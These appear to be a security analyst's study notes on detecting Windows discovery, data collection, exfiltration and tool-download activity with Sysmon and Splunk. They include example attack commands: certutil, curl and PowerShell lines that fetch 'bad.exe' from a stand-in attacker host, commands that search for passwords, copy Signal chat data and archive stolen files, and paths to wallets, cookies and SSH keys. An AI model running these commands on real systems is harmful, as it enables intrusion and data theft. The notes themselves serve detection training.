# Discovery (Situational Awareness)

After getting in, attackers don't know what they've landed on. Discovery is how they learn the host's purpose, the user's privileges, and the network, and it maps to the MITRE **Discovery** tactic.

## Why Attackers Do It

- Phishing sends thousands of attachments but breaches only a few systems the attacker has never seen
- They need to know: "Who am I?" and "Where am I?"
- Goals: find the host's value, find security tools that could stop the attack

## Discovery Commands

| Purpose | Why attackers want it | CMD / PowerShell commands |
|---|---|---|
| Files and folders | Host purpose, victim's job or interests | `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>` |
| Users and groups | Who uses the host, with which privileges | `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser` |
| System and apps | Vulnerabilities, apps to steal data from | `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service` |
| Network settings | Is the host part of a corporate network | `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles` |
| Active antivirus | How risky it is to continue without being blocked | `Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"` |

## Discovery Process

1. Phishing attachment is launched (see the phishing notes)
2. It runs basic discovery commands automatically
3. Malware may delete itself if:
   - A specific antivirus is installed
   - The victim isn't from a targeted company or country
4. Otherwise it connects back to the attacker, giving full control
5. Human attackers then type more Discovery commands as needed

## Detection Tips

- Sysmon Event ID 1: many of these tools in a short window from the same parent (`whoami`, `net user`, `ipconfig`, `systeminfo`)
- One of these commands is normal for admins; a burst from one process tree is the signal
- Suspicious parents: `powershell.exe` or `cmd.exe` launched by `explorer.exe`, an Office app, or a script
- PowerShell discovery commands typed in a console won't appear in Event ID 1, so also check the history file (see the PowerShell note)
- The AV query hits `root\SecurityCenter2`: unusual outside security tools, worth alerting on
- Same pivot as earlier notes: `ProcessId` for the tree, Logon ID for the session
- Splunk starting point (field names may differ in your data):

        index=windowslogs EventID=1 (Image="*\\whoami.exe" OR Image="*\\net.exe" OR Image="*\\ipconfig.exe" OR Image="*\\systeminfo.exe" OR Image="*\\tasklist.exe") | stats count by ParentImage, User | sort - count

---

# Detecting Discovery: CMD and GUI

Discovery via the command line is the easiest and most common method, because the commands (`whoami`, `ipconfig`) exist on every Windows machine. Most of them are logged as new processes, so a process tree exposes them.

## Discovery via CMD

- Built-in commands, nothing to download
- Real-world attack example: see the article linked in the lesson (link not in the paste)
- Most commands show up as new processes (Sysmon Event ID 1)

Process tree from a phishing binary:

    C:\Users\victim\Downloads\invoice.pdf.exe
    ├── C:\Windows\System32\cmd.exe
    │   ├── ipconfig                          // network settings
    │   ├── whoami /priv                      // user permissions
    │   ├── dir                               // list current directory
    │   ├── net user                          // list local users
    │   ├── tasklist /v                       // running processes
    │   └── wmic computersystem get model     // laptop model
    └── C:\Windows\...\powershell.exe
        ├── Get-Service                       // active services
        └── Get-MpPreference                  // MS Defender settings

- Red flag: a downloaded double-extension binary spawning `cmd.exe` and `powershell.exe`, which then run a burst of discovery commands
- `Get-MpPreference` checks Defender settings, so the attacker is probing for security tools

## Discovery via GUI

- Happens when attackers log in interactively (e.g. after an RDP breach)
- They can use the same tools you do: Apps & Programs, System Settings, Disk Management, Event Viewer
- No typical `whoami` commands, so the tree looks different
- They often still use CMD out of habit

Process tree after an interactive login:

    C:\Windows\System32\explorer.exe
    ├── cmd.exe                                    // CMD still possible
    ├── mmc.exe compmgmt.msc                       // Computer Management
    ├── control.exe netconnections                 // network adapters
    ├── SystemSettings.exe [...]                   // settings panel
    ├── notepad.exe C:\...\secrets.txt             // read a text file
    └── taskmgr.exe                                // Task Manager

## CMD vs GUI Trees

| | CMD discovery | GUI discovery |
|---|---|---|
| Typical parent | Malware binary → `cmd.exe` / `powershell.exe` | `explorer.exe` |
| Typical access | Phishing, malware launch | Interactive login (RDP) |
| Signal | Burst of discovery commands | Admin tools opened by a user session |

## How to Detect

1. Find a discovery command, or better, a **sequence** in a short time
   - Sysmon Event ID 1
   - New rows in the PowerShell history file
2. Find where the commands came from
   - `ipconfig` alone is normal (IT staff, legitimate tools); don't raise alarms over one
3. Build the process tree from Sysmon:
   - Filter for Event ID 1
   - Correlate `ProcessId` with `ParentProcessId`
4. If unsure what a command does, look it up

## Detection Tips

- Judge the **parent**, not the command: `ipconfig` under `invoice.pdf.exe` is bad, under an IT tool is fine
- Several different discovery commands within seconds is the strongest signal
- For GUI cases, `notepad.exe` opening a file named `secrets.txt` or similar is the tell; pair it with the logon (type 10 RDP) and Logon ID
- Same process-tree method as the process monitoring note
- Splunk starting point to find the children of a suspicious parent (field names may differ in your data):

        index=windowslogs EventID=1 ParentProcessId=<id> | table _time Image CommandLine ParentImage

---

# Collection, Credential Access, and Exfiltration

After discovery, attackers grab the actual treasure: data they can sell, use, or leverage for a bigger attack. Three MITRE tactics apply: [Collection](https://attack.mitre.org/tactics/TA0009/), [Credential Access](https://attack.mitre.org/tactics/TA0006/), [Exfiltration](https://attack.mitre.org/tactics/TA0010/). For simplicity, Credential Access is treated as part of Collection.

## Collection Targets

Targets depend on the attacker's goal:

- Personal info: images, chats
- Crypto wallets, gaming and banking accounts
- Advanced groups: use the victim as a way into the corporate network, hoping for full-scale ransomware

Most sensitive data sits in plain files, but secrets can also hide in the **registry** or **process memory**.

| Goal | Target paths |
|---|---|
| Blackmail the victim (photos, chats, browser history) | `C:\Users\<user>\AppData\Roaming\Signal\*`, `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History` |
| Steal money (banking sessions, crypto wallets) | `C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat`, `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies` |
| Steal corporate data (SSH credentials, databases) | `C:\Users\<user>\.ssh\*`, `C:\Program Files\Microsoft SQL Server\...\DATA\*` |

## How Collection Happens

- **Scripts:** automatic, usually under a minute
- **Human attackers:** manual, may take hours to find and review interesting files
- Both end with exfiltration: uploading stolen data to a server the attacker controls

## Exfiltration Tricks

Attackers hide in trusted traffic:

| Method | Examples |
|---|---|
| Trusted cloud storage | Dropbox, Mega, Amazon S3 ([MITRE examples](https://attack.mitre.org/techniques/T1567/002/#:~:text=Procedure%20Examples)) |
| Code repos and messengers | GitHub, Telegram ([example: Continental Stealer](https://cyberint.com/blog/research/the-new-infostealer-in-town-the-continental-stealer/#:~:text=offers%20a%20Telegram%20bot%20notification%20feature%20that%20informs%20users)) |
| Look-alike domain | A trustworthy-sounding domain like `windows-updates.com` |

## Detection Tips

- Sysmon Event ID 1: processes touching the paths above (`.ssh`, `wallet.dat`, Chrome `Cookies`/`History`) that aren't the owning app
- Archive creation (`.zip`, `.rar`, `7z`) right before an outbound connection often means staged data
- Sysmon Event ID 3 / 22: connections and DNS lookups to Dropbox, Mega, S3, GitHub, or Telegram from an unexpected process
- Trusted domains don't mean safe traffic; judge by **which process** connects, not just the destination
- Look-alike domains: check domain age and spelling
- Ties to the earlier exfiltration notes (DNS, FTP, HTTP, ICMP): same goal, different channel
- Splunk starting point (field names may differ in your data):

        index=windowslogs EventID=3 DestinationHostname IN ("*dropbox*", "*mega.nz*", "*telegram*", "*github*") | stats count by Image, DestinationHostname | sort - count

---

# Detecting Collection

Attackers use the same CMD and GUI options as in Discovery, but now they look for specific sensitive files and folders, so you detect them by tracking commands that touch those files.

## Collection Commands

| Command | What the attacker did |
|---|---|
| `notepad.exe C:\Users\<user>\Desktop\finances-2025.csv` | Opened an interesting file in Notepad |
| `type debug-logs.txt \| findstr password > C:\Temp\passwords.txt` | Searched a file for "password" and saved the hits |
| `Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf` | Searched the home folder for PDFs |
| `copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\` | Copied Signal chat history to Temp |
| `Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip` | Archived stolen data for exfiltration |
| `7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*` | Same, using existing 7-Zip |

- The source text had a look-alike (Cyrillic) "С" in some `C:\Temp\` paths; I used the normal letter
- Pattern: find, copy to a staging folder (`C:\Temp`), archive, then exfiltrate

## Collection Example

- Attackers opened files of interest in Notepad and WordPad
- Then archived everything at once with 7-Zip
- All of it was visible in Sysmon Event ID 1 (the screenshot wasn't included in the paste)

## Data Stealers

| | Human attacker | Data stealer |
|---|---|---|
| Typical target | Big networks | Personal workstations |
| Method | Manual: CMD, PowerShell, GUI apps | Automated malware |
| Visibility | Commands show in Event ID 1 and history | Uses its own code, rarely CMD or PowerShell |
| Logs tell you | Which files were opened | Little: hard to tell what was accessed or stolen |

- A data stealer automates both collection and exfiltration
- Example: Gremlin stealer, a single file that steals:
  - VPN profiles
  - Crypto wallets
  - Browser sessions
  - Steam, Discord, Telegram data
  - Screenshots of the host
- Details: [Unit42 blog on Gremlin Stealer](https://unit42.paloaltonetworks.com/new-malware-gremlin-stealer-for-sale-on-telegram/)

### Code Example: Telegram Data Theft

The screenshot shows the stealer's C# function `GetTdata()`:

1. Builds the default path: `%APPDATA%\Telegram Desktop\tdata`
2. Checks whether a process named `Telegram` is running
3. If not running, returns the default path
4. If running, takes the folder of the running Telegram executable and returns its `tdata` subfolder

- `tdata` holds Telegram's session data, which can allow account takeover
- Step 4 handles portable Telegram installs outside the default location
- Takeaway for analysts: the stealer's logic is just file paths, so there are no obvious commands to catch

## Detection Tips

- Sysmon Event ID 1: `notepad.exe` or `wordpad.exe` opening files from `Desktop` or `Documents`
- Look for `findstr`, `Get-ChildItem -Recurse`, `copy` into `C:\Temp`, then `7za.exe`, `Compress-Archive`, `.zip` creation
- Sysmon Event ID 11: new archives (`.zip`, `.rar`, `.7z`) in `C:\Temp` or `ProgramData`
- For stealers, watch **file access to app data folders by an unexpected process** (general knowledge: needs file-access auditing or EDR, since Sysmon Event ID 1 won't show it)
- Archive creation followed by an outbound connection (Event ID 3) is the full collection-to-exfiltration chain
- Same process-tree method as the Discovery notes: judge the parent, not just the command
- Splunk starting point (field names may differ in your data):

        index=windowslogs EventID=1 (Image="*\\7za.exe" OR Image="*\\7z.exe" OR CommandLine="*Compress-Archive*") | table _time Image CommandLine ParentImage User

---

# Ingress Tool Transfer

Attackers rarely start with fully functional malware. They download more tools after the first foothold. MITRE maps this to **Ingress Tool Transfer**, used in most breaches.

## Why Download More Tools

- Small first stage: a tiny phishing attachment or a bare RDP session
- Later stages need more, for example:
  - Discovery script like Seatbelt
  - Credential tool like Mimikatz
  - Full RAT like Remcos RAT
  - Ransomware binary, deployed after data is stolen
- Why not ship everything at once:
  - Split malware to bypass antivirus
  - Limit exposure of their tools and exploits if caught early

## Common Transfer Methods

| Method | Example |
|---|---|
| Certutil | `certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe` |
| Curl (Windows 10+) | `curl.exe https://blackhat.thm/bad.exe -o good.exe` |
| PowerShell IWR | `powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"` |
| GUI | No CMD needed: copy-paste via RDP or download in a web browser |

- The lesson's LNK example used PowerShell `WebClient.DownloadFile`, so there are many ways beyond these
- Note the rename: `bad.exe` saved as `good.exe`, a simple disguise

## Detecting Tool Transfer

A transfer needs a network connection, so track a connection or DNS request from the suspicious process. Attackers also download from legitimate services like GitHub, so analyze:

1. Which **process** is making the connection
2. The **destination domain**
3. The **file** being downloaded

## Sysmon Event Chain (Screenshot Walkthrough)

| Step | Event ID | What happened |
|---|---|---|
| 1 | 1 | `cmd.exe` launched |
| 2 | 1 | `curl.exe` starts the download: `curl.exe http://blackhat.thm/bad.exe -o good.exe` |
| 3 | 11 | File downloaded (file created) |
| 4 | 22 | DNS query for `blackhat.thm` |

- The screenshot labels the connection as #4, but it should be #3 (a delayed event)
- Why: Sysmon logs the DNS query late, so logs can appear out of order
- Sort by `ProcessId` and the Sysmon `ProcessGuid`, not just time
- Key fields from Event ID 1:
  - `Image: C:\Windows\System32\curl.exe`
  - `OriginalFileName: curl.exe`
  - `CommandLine: curl.exe http://blackhat.thm/bad.exe -o good.exe`

## Detection Tips

- Red flags in Event ID 1 command lines:
  - `certutil` with `-urlcache`
  - `curl` or `Invoke-WebRequest` with `-o` / `-OutFile`
  - Download from an unusual domain, saved under a different name
- Legitimate tools used illegitimately: `certutil`, `curl`, and PowerShell are built into Windows, so judge by command line and parent, not the tool name
- `OriginalFileName` helps catch renamed tools: a `curl` binary renamed to something else still shows `curl.exe` here
- Follow-up check: after Event ID 11 creates the file, look for Event ID 1 where the new file is the `Image` (the downloaded tool running)
- Staging paths to watch: `C:\ProgramData`, `C:\Temp`, `Downloads`
- Splunk starting point (field names may differ in your data):

        index=windowslogs EventID=1 (CommandLine="*urlcache*" OR (Image="*\\curl.exe" CommandLine="*-o*") OR CommandLine="*Invoke-WebRequest*") | table _time Image CommandLine ParentImage User
